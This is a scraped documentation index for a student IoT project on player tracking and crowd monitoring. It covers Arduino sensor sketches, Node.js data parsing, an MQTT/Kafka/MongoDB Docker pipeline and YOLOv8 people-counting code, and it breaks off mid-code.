Sketch​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#2-structure-of-arduino-sketch","content":" Arduino programs, known as sketches, consist of two main functions:  setup(): Runs once when the device starts, used for initial configuration.loop(): Runs repeatedly, allowing the device to change and respond. Understanding these functions is key to effective programming.  ","version":"Next","tagName":"h3"},{"title":"3. Digital and Analog I/O​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#3-digital-and-analog-io","content":" Learning to control digital and analog inputs and outputs is fundamental. This includes reading data from sensors and writing to actuaries, LEDs, and other components. For our project, interfacing with sensors like the MAX30102 is particularly important.  ","version":"Next","tagName":"h3"},{"title":"4. Serial Communication​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#4-serial-communication","content":" Serial communication is essential for debugging and data transmission. Skills in using the Serial Monitor for outputting data readings and debugging information are vital for troubleshooting and refining system integrations.  ","version":"Next","tagName":"h3"},{"title":"5. Libraries and Sensor Integration​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#5-libraries-and-sensor-integration","content":" Studying how to include and use libraries is crucial for expanding the Arduino's capabilities without writing complex code from scratch. Libraries for specific sensors (e.g., MAX30102) and functionalities (e.g., Bluetooth communication) simplify the addition of hardware and advanced features.  ","version":"Next","tagName":"h3"},{"title":"6. Wi-Fi and Network Communication​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#6-wi-fi-and-network-communication","content":" Given the IoT nature of the project, understanding the basics of network programming, including connecting to Wi-Fi networks and sending data over the internet, is essential. This capability allows the Arduino Nano 33 IoT to transmit sensor data to cloud platforms or a central server for analysis.  ","version":"Next","tagName":"h3"},{"title":"Applied Learning for Project Implementation​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#applied-learning-for-project-implementation","content":" Using the Arduino Nano 33 IoT, we applied the above concepts to collect and manage data from various sensors critical to our project's objectives:  Oximeter Sensor: For measuring blood oxygen saturation.Heart Rate Monitor: For tracking physiological data crucial in health monitoring within crowded environments.GPS: To provide positional data, essential for real-time tracking and management of crowds.Accelerometer: To monitor and analyze movement patterns, useful in dynamic environments like sports events.  The Arduino processes this data to derive actionable insights, performing calculations and handling network communications simultaneously. This robust application showcases the Arduino’s capacity to integrate various technologies into a cohesive IoT system.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#conclusion","content":" The study and application of Arduino programming are fundamental to the success of our player tracking and crowd monitoring project. By bridging hardware components with sophisticated software functionalities, we have created a versatile and powerful system. This foundation not only enables effective data collection and analysis but also ensures our project can adapt to future technological advancements and requirements. The knowledge and skills gained through this Arduino programming study provide a strong basis for innovative solutions in data-driven decision-making and operational efficiency in IoT applications. ","version":"Next","tagName":"h2"},{"title":"Data Parsing Implementation in Node.js for Arduino Sensor Data","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#overview","content":" For this project, the goal was to capture sensor data from an Arduino device, transmit it via a serial connection, and store it in a MongoDB database using a Node.js application. To enhance the utility and accessibility of the stored data for future querying and analysis, it was essential to implement data parsing before data storage.  ","version":"Next","tagName":"h2"},{"title":"Rationale​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#rationale","content":" Raw data transmitted from Arduino typically includes various sensor readings in a non-structured format, which might be interspersed with metadata or other information. Storing such data directly into a database can lead to issues with data retrieval, increase the complexity of query operations, and potentially affect performance due to the unstructured nature of the data. By parsing the data before storage:  Structure is imposed, making the database schema more consistent and predictable.Data integrity is enhanced as only valid and correctly formatted data is stored.Query performance is improved, allowing for more efficient data analysis and retrieval operations.  ","version":"Next","tagName":"h2"},{"title":"Data Parsing Process​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#data-parsing-process","content":" ","version":"Next","tagName":"h2"},{"title":"Step 1: Data Reception​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#step-1-data-reception","content":" The Node.js application listens to the serial port for data transmitted by the Arduino. Each piece of data received is a string that potentially contains multiple sensor readings formatted in a predefined pattern. Example of raw data received:  18:45:19.234 -&gt; Speed: 1.01 Direction: Down   ","version":"Next","tagName":"h3"},{"title":"Step 2: Parsing Logic​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#step-2-parsing-logic","content":" The data parsing function extracts relevant pieces of information from the raw data strings using regular expressions. This method ensures that only the necessary data (e.g., speed and direction) is extracted, ignoring any irrelevant metadata or formatting characters. Parsing Function Example:  javascript function parseData(data) { const speedMatch = data.match(/Speed: ([\\d.]+)/); const directionMatch = data.match(/Direction: (\\w+)/); if (speedMatch &amp;&amp; directionMatch) { return { speed: parseFloat(speedMatch[1]), direction: directionMatch[1], timestamp: new Date() // Adding a timestamp for each data entry }; } return null; // Return null if data does not match expected pattern }   ","version":"Next","tagName":"h3"},{"title":"Benefits​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#benefits","content":" Implementing data parsing within this Node.js application provided several key benefits:  Improved Data Management: Structured data storage makes it easier to manage, update, and delete data entries.Enhanced Analytical Capabilities: Well-structured data supports more complex queries and analytical operations such as aggregations and statistical analysis.Scalability: As the system scales and handles more data sources or varied data formats, maintaining structured data input becomes crucial for system performance and reliability.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Data Parsing Implementation in Node.js for Arduino Sensor Data","url":"/redback-documentation/docs/project-4/iot/Data_parsing_guide_accelerometer#conclusion","content":" Data parsing plays a critical role in the efficient and effective storage and management of sensor data in IoT applications. By structuring data before it enters the database, the system ensures that the data is ready for immediate use in applications and analyses, thus enhancing the overall utility of the data collection system.  GitHub Project Link  Mongo prior steps Link ","version":"Next","tagName":"h2"},{"title":"Pipeline for Real-time Data Logistics Handling and Storage","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB","content":"","keywords":"","version":"Next"},{"title":"1. How to run the application​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#1-how-to-run-the-application","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Clone the repository​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#11-clone-the-repository","content":" git clone https://github.com/Redback-Operations/redback-orion/tree/main/Player_Tracking/DataLogisticsPipeline  ","version":"Next","tagName":"h3"},{"title":"1.2 Locate the docker-compose.yml file is located.​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#12-locate-the-docker-composeyml-file-is-located","content":" ","version":"Next","tagName":"h3"},{"title":"1.3 Execute the next command to run the application.​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#13-execute-the-next-command-to-run-the-application","content":" sudo docker compose up --scale sensor=1   ","version":"Next","tagName":"h3"},{"title":"1.4 How to communicate with the server​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#14-how-to-communicate-with-the-server","content":" Currently, we simulate the real-time data by sending demo data regularly with sensor.js in Data_collection folder.  function main() { const mqtt = require('mqtt'); // Connect to the message broker const client = mqtt.connect( { host: 'mosquitto', port: 1883 } ); // Read csv let collectedData = (require(&quot;fs&quot;).readFileSync(&quot;./demo_data.csv&quot;, &quot;utf8&quot;)).split(&quot;\\r&quot;); collectedData.shift(); client.on('connect', () =&gt; { console.log('Sensor '+ process.env.HOSTNAME + ' is now connected to the MQTT broker'); publishCollectedData(collectedData, 'Image', client); }); }   One can changes the demo data by reading from CSV file by some other data source to push data to our MQTT after the connection.  ","version":"Next","tagName":"h3"},{"title":"1.6 How to integrate existing models​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#16-how-to-integrate-existing-models","content":" One can update the model path to integrate models into the existing pipeline for data analysis and then add the data and analysis reults into MongoDB for further analysis, visualization or recording.  # Data Analysis for Crowd Monitering and Player Tracking m = load(```Model Path```) print(&quot;Starting Data Analysis&quot;) for message in my_consumer: print(&quot;------------- Model Analysis -------------&quot;) print(f&quot;Data {message} is being processed&quot;) message = message.value df_pred = pd.DataFrame.from_records([{&quot;ds&quot;: message['ts']}]) df_pred['ds'] = pd.to_datetime(df_pred['ds']) forecast = m.predict(df_pred) forecast['sensor'] = message['sensor'] my_producer.send('analytics_results', value= forecast[['ds', 'yhat', 'yhat_lower', 'yhat_upper', 'sensor']].to_json(orient=&quot;index&quot;, date_format='iso'))   ","version":"Next","tagName":"h3"},{"title":"1.6 How to visualize existing data​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#16-how-to-visualize-existing-data","content":" Access the followign URL with browser to visualize existing data  http://localhost:8081/     ","version":"Next","tagName":"h3"},{"title":"2. Requirements​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#2-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Introduction​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#21-introduction","content":" The Real-Time Data Processing and Storage System aims to provide a robust and efficient solution for processing and storing data in real-time for the Crowd Monitoring and Player Tracking project. This document outlines the system architecture, components, features, deployment strategy, and interaction details for stakeholders and participants involved in the project.  ","version":"Next","tagName":"h3"},{"title":"2.2 Stakeholders​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#22-stakeholders","content":" Project Team: Responsible for system development, deployment, and maintenance. Data Analysts: Utilize processed data for insights and decision-making. IT Administrators: Manage system infrastructure and configuration. End Users: Interact with the system to access real-time data.  ","version":"Next","tagName":"h3"},{"title":"2.3 System Overview​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#23-system-overview","content":" Frontend Interface: Allows users to interact with the system. Backend Services: Includes MongoDB Container, Kafka Container, Data Processing Layer, and Storage Layer. Real-Time Processing Layer: Handles incoming data streams for processing. Communication Layer: Facilitates communication between system components.  ","version":"Next","tagName":"h3"},{"title":"2.4 Features​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#24-features","content":" Real-Time Data Ingestion: Accepts and processes incoming data streams. Data Storage: Stores processed data in MongoDB. Event Streaming: Utilizes Kafka for real-time event streaming. Data Processing: Analyzes and processes data based on predefined algorithms. Monitoring and Alerts: Provides monitoring capabilities and alerts for system health.  ","version":"Next","tagName":"h3"},{"title":"2.5 Deployment​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#25-deployment","content":" The system will be deployed using Docker containers for MongoDB and Kafka. Detailed deployment instructions will be provided to stakeholders for easy setup and maintenance. Continuous monitoring and logging will be implemented to ensure system stability and performance.  ","version":"Next","tagName":"h3"},{"title":"2.6 Challenges Faced and Solutions​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#26-challenges-faced-and-solutions","content":" Configuration Issues: Addressed by refining Docker container configurations and port mappings. Performance Optimization: Implemented optimizations in data processing algorithms for increased efficiency. Error Handling: Enhanced error handling mechanisms for better fault tolerance and system reliability.  ","version":"Next","tagName":"h3"},{"title":"2.7 Future Enhancements​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#27-future-enhancements","content":" Scalability: Implement mechanisms for horizontal scaling to handle increased data load. Security Enhancements: Introduce encryption and authentication measures to secure data transmission. Integration with AI Models: Incorporate machine learning models for advanced data analysis.  ","version":"Next","tagName":"h3"},{"title":"3. Design​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#3-design","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Architecture​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#31-architecture","content":"   ","version":"Next","tagName":"h3"},{"title":"3.2 Services​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#32-services","content":" 3.2.1 MongoDB Service​  The MongoDB service is created using the official MongoDB image. It is crucial for data storage within the system. By defining the root username and password in the environment variables, the service ensures secure access to the database. MongoDB acts as the primary data repository where information collected by the sensor service and processed by the server service is stored for further analysis and retrieval.  3.2.2 MQTT Service​  The MQTT service utilizes the Eclipse Mosquitto image to establish an MQTT broker. This component is essential for handling messaging within the system. By setting up volumes and ports, the service facilitates communication between various components by enabling the exchange of real-time data streams. Mosquitto serves as the messaging backbone, allowing seamless interaction between different services.  3.2.3 Server Service​  The server service, constructed from a Dockerfile in the Server context, acts as the core processing unit within the system. By linking to Mosquitto, MongoDB, and Kafka, it establishes connections to key components for data processing and analysis. The server service processes incoming data streams, conducts real-time analytics, and stores results in the MongoDB database. It serves as the central hub for data manipulation and decision-making.  3.2.4 Mongo Service​  MongoDB Express Service provides a user-friendly web interface for managing the MongoDB database. By configuring the connection settings to the MongoDB service, it allows users to interact with the database visually. This service simplifies database management tasks such as querying, updating, and deleting data, providing a convenient way to monitor and administer the stored information.  3.2.5 Kafka Service​  The Kafka service, based on the Confluent Kafka image, enables real-time data streaming and processing. By connecting to Zookeeper for coordination, Kafka establishes a robust messaging system for handling data streams efficiently. With defined environment variables and port mappings, Kafka ensures high-throughput data transfer and fault-tolerant message processing, supporting the real-time analytics and decision-making processes within the system.  3.2.6 Zookeeper Service​  Zookeeper, deployed using the Confluent Zookeeper image, serves as the distributed coordination platform for the system. By defining specific environment variables and ports, Zookeeper ensures seamless communication and synchronization among the various services. It plays a pivotal role in maintaining consistency and managing distributed resources across the system.  3.2.7 Sensor Service (for simulation)​  The sensor service is built from a custom Dockerfile within the Data_collection context. It is responsible for collecting real-time data from sensors and devices. By linking to the MQTT service, the sensor service can publish data to specific MQTT topics for consumption by other services. This component plays a vital role in the initial data acquisition stage of the system.  3.2.8 Model Analysis Service(for simulation)​  The model analysis service, built from a Dockerfile in the Models_analysis context, focuses on data analysis and modeling tasks. By depending on Kafka for data ingestion and processing, this service is dedicated to running complex algorithms, statistical models, and machine learning processes on the incoming data streams. It plays a critical role in extracting insights and patterns from the real-time data for decision support.  ","version":"Next","tagName":"h3"},{"title":"4. Relationships of Service​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#4-relationships-of-service","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 Flow Chart​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#41-flow-chart","content":"   ","version":"Next","tagName":"h3"},{"title":"4.2 Sequence Diagram​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#42-sequence-diagram","content":"   The relationships between the services in the Real-time Data Processing and Storage System are crucial for seamless operation and data flow.  ","version":"Next","tagName":"h3"},{"title":"4.3 Between Sensor Service and MQTT Service​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#43-between-sensor-service-and-mqtt-service","content":" The sensor service publishes data to MQTT topics on the Mosquitto broker, enabling other services to subscribe to and process the incoming data streams.  ","version":"Next","tagName":"h3"},{"title":"4.4 Between Server Service and MQTT, MongoDB, Kafka Services​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#44-between-server-service-and-mqtt-mongodb-kafka-services","content":" The server service connects to Mosquitto for data ingestion, MongoDB for data storage, and Kafka for real-time data streaming and processing. It acts as the central processing unit that orchestrates data flow between these services.  ","version":"Next","tagName":"h3"},{"title":"4.5 Between Model Analysis Service and Kafka Service​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#45-between-model-analysis-service-and-kafka-service","content":" The model analysis service relies on Kafka for receiving real-time data streams, processing them through analytical models, and generating insights. Kafka serves as the messaging backbone for data exchange between the model analysis service and other components.  ","version":"Next","tagName":"h3"},{"title":"4.6 Between Mongo Express Service and MongoDB Service​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#46-between-mongo-express-service-and-mongodb-service","content":" MongoDB Express interfaces with the MongoDB service, providing a visual management tool for interacting with the database. It enhances the usability and accessibility of the MongoDB database for administrators and users.  ","version":"Next","tagName":"h3"},{"title":"4.7 Between Kafka Service and Zookeeper Service​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#47-between-kafka-service-and-zookeeper-service","content":" Kafka depends on Zookeeper for distributed coordination and management of topics, partitions, and offsets. Zookeeper ensures the reliability and consistency of Kafka's messaging system, facilitating seamless data streaming and processing.  ","version":"Next","tagName":"h3"},{"title":"5. Implementation Results and Demonstration​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#5-implementation-results-and-demonstration","content":"               ","version":"Next","tagName":"h2"},{"title":"6. Reference​","type":1,"pageTitle":"Pipeline for Real-time Data Logistics Handling and Storage","url":"/redback-documentation/docs/project-4/DataLogistic/Real-time-Data-Logistics-Processing-Strorage-MQTT-Kafka-MongoDB#6-reference","content":" [1] https://mqtt.org/  [2] https://hub.docker.com/_/eclipse-mosquitto  [3] https://github.com/eclipse/mosquitto  [4] https://kafka.apache.org/  [5] https://github.com/apache/kafka  [6] https://hub.docker.com/r/apache/kafka  [7] https://www.mongodb.com/  [8] https://github.com/mongodb/mongo  [9] https://hub.docker.com/_/mongo  [10] https://github.com/sergio11/iot_event_streaming_architecture ","version":"Next","tagName":"h2"},{"title":"Research on Closed-Loop Systems and FSMs for Sensor Integration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#introduction","content":" This report explores the application of closed-loop systems and Finite State Machines (FSMs) to enhance the integration and functionality of multiple sensors—specifically heart rate monitors, accelerometers, and GPS—within our project. We discuss how these methods can lead to more accurate data collection and improved system performance.  ","version":"Next","tagName":"h2"},{"title":"Understanding Closed-Loop Systems​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#understanding-closed-loop-systems","content":" Closed-loop systems, or feedback control systems, utilize feedback to control the state of a system based on its output. In the context of sensor integration, closed-loop systems can adjust the sensitivity or sampling rate of sensors based on real-time data, enhancing the system's adaptability and accuracy.  ","version":"Next","tagName":"h2"},{"title":"Application in Sensor Integration​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#application-in-sensor-integration","content":" For instance, if the heart rate sensor detects an anomaly in readings, the system could automatically increase the sampling rate for more detailed data, while simultaneously adjusting the accelerometer to monitor for unusual movements, enhancing the detection of potential emergencies.  ","version":"Next","tagName":"h3"},{"title":"Finite State Machines (FSMs) Overview​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#finite-state-machines-fsms-overview","content":" A Finite State Machine is a computational model consisting of a limited number of states. It's a powerful tool for managing complex logic in systems that need to handle multiple sensor inputs efficiently.  ","version":"Next","tagName":"h2"},{"title":"FSMs in Our Project​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#fsms-in-our-project","content":" In our sensor setup, an FSM could manage states such as:  Initialization: Setting up sensor parameters and calibrating.Data Collection: Regular monitoring and data recording.Anomaly Detection: Identifying unusual readings and responding appropriately.Error Handling: Managing sensor errors or failures.Power Saving: Reducing power consumption when sensors are not needed.  ","version":"Next","tagName":"h3"},{"title":"Implementing Closed-Loop Systems and FSMs​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#implementing-closed-loop-systems-and-fsms","content":" ","version":"Next","tagName":"h2"},{"title":"Using Arduino Code from Previous Example​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#using-arduino-code-from-previous-example","content":" Let's enhance the Arduino setup to include basic FSM and closed-loop behavior. Below is a revised version of your sensor code that incorporates these concepts:  #include &quot;DFRobot_BloodOxygen_S.h&quot; // Define the I2C address for the MAX30102 sensor #define I2C_ADDRESS 0x57 DFRobot_BloodOxygen_S_I2C MAX30102(&amp;Wire, I2C_ADDRESS); enum State { INIT, COLLECT_DATA, CHECK_DATA, ERROR }; State currentState = INIT; void setup() { Serial.begin(115200); } void loop() { switch (currentState) { case INIT: if (MAX30102.begin() == true) { currentState = COLLECT_DATA; Serial.println(&quot;Sensor initialized.&quot;); } else { Serial.println(&quot;Sensor failed to initialize.&quot;); currentState = ERROR; } break; case COLLECT_DATA: MAX30102.sensorStartCollect(); currentState = CHECK_DATA; break; case CHECK_DATA: if (checkSensorData()) { Serial.println(&quot;Data is within expected range.&quot;); delay(1000); // Data collection interval } else { Serial.println(&quot;Data out of range, adjusting parameters...&quot;); adjustSensorSettings(); } break; case ERROR: handleSensorError(); break; } } bool checkSensorData() { // Logic to check if data is within an expected range return true; } void adjustSensorSettings() { // Adjust settings based on data feedback } void handleSensorError() { // Handle errors and attempt to reset sensors }   ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Research on Closed-Loop Systems and FSMs for Sensor Integration","url":"/redback-documentation/docs/project-4/iot/Closed_Loop_FSM_Sensor_Integration#conclusion","content":" Integrating closed-loop systems and FSMs with multiple sensors in our project allows for more dynamic and responsive management of sensor data. This approach not only improves the accuracy and reliability of the data collected but also enhances the system's ability to adapt to different conditions and detect anomalies more effectively. ","version":"Next","tagName":"h2"},{"title":"Crowd Monitoring Overview","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview","content":"","keywords":"","version":"Next"},{"title":"YOLOv8​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#yolov8","content":" Computer Vision (CV) is used in traffic anlysis, automation of manufacturing processed,and human monitoring, which is the essential aspect that we are focusing this semester.  YOLOv8 is a state of the art to monitor and track people in real-time. By combine that with Supervision library, we can detect and track people.  Source: https://docs.ultralytics.com/models/yolov8/  Blue print  We are focusing to build a pipeline for real-time camera process.  CCTV &gt;&gt; YOLOv8 &gt;&gt; MongoDB &gt;&gt; Website/Dashboard  Initialize libraries  This tells you the versions of both PyTorch and CUDA that are installed for Environment setup:  python import torch !nvcc --version TORCH_VERSION = &quot;.&quot;.join(torch.__version__.split(&quot;.&quot;)[:2]) CUDA_VERSION = torch.__version__.split(&quot;+&quot;)[-1] print(&quot;torch: &quot;, TORCH_VERSION, &quot;; cuda: &quot;, CUDA_VERSION)   We will use YOLOv8 in this project:  python !pip install ultralytics from IPython import display display.clear_output() import ultralytics ultralytics.checks()   Supervision library:  python !pip install supervision==0.2.0 from IPython import display display.clear_output() import supervision as sv print(&quot;supervision&quot;, sv.__version__)   python import os HOME = os.getcwd() print(HOME)   Testing Crowd Monitoring  We will use video from Supervision assets - PEOPLE_WALKING  https://media.roboflow.com/supervision/video-examples/people-walking.mp4  After downloaded, you will need to import into to your directory if using on Google Colab.  Video testing with YOLOv8 model  python # Importing Libraries from ultralytics import YOLO, solutions from ultralytics.solutions import object_counter import cv2 import os import numpy as np from IPython.display import display, Image # Define the video path - Use your own path MARKET_SQUARE_VIDEO_PATH = &quot;/content/people-walking.mp4&quot; # Open the video file cap = cv2.VideoCapture(MARKET_SQUARE_VIDEO_PATH) assert cap.isOpened(), &quot;Error reading video file&quot; # Load the YOLO model model = YOLO(&quot;yolov8n.pt&quot;) # Verify the output directory and permissions output_dir = &quot;/content&quot; if not os.path.exists(output_dir): os.makedirs(output_dir) if not os.access(output_dir, os.W_OK): raise PermissionError(f&quot;Write permission denied for the directory {output_dir}&quot;) # Define the output video path output_path = os.path.join(output_dir, &quot;Peoplewalking_v8_29July.mp4&quot;) # Reading the Video w, h, fps = (int(cap.get(x)) for x in (cv2.CAP_PROP_FRAME_WIDTH, cv2.CAP_PROP_FRAME_HEIGHT, cv2.CAP_PROP_FPS)) # Initialize VideoWriter with a successful FourCC code fourcc_code = cv2.VideoWriter_fourcc(*&quot;mp4v&quot;) video_writer = cv2.VideoWriter(output_path, fourcc_code, fps, (w, h)) if not video_writer.isOpened(): raise IOError(f&quot;Error initializing video writer with path {output_path}&quot;) # Assigning the points for Region of Interest region_points = [(20, 1000), (1080, 1000), (1080, 2000), (20, 2000)] # Initialize the ObjectCounter with the model's class names counter = solutions.ObjectCounter( view_img=True, reg_pts=region_points, names=model.names, draw_tracks=True, line_thickness=2, ) while cap.isOpened(): success, im0 = cap.read() if not success: print(&quot;Video frame is empty or video processing has been successfully completed.&quot;) break tracks = model.track(im0, persist=True, show=False, imgsz=1280) im0 = counter.start_counting(im0, tracks) video_writer.write(im0) cap.release() video_writer.release() cv2.destroyAllWindows() print(f&quot;Processed video saved to {output_path}&quot;)   We have two methods with Camera integration:  RTSP url - high latencyVirtue Camera - Camo Studio app - low latency  RTSP Camera testing with YOLOv8  Camera testing with YOLOv8  python !pip install opencv-python numpy ultralytics Flask   python !pip install &quot;pymongo[srv]&quot;   python from flask import Flask, Response import cv2 import numpy as np from ultralytics import YOLO from pymongo import MongoClient from datetime import datetime, date import time from dotenv import load_dotenv import os # Load YOLO model model = 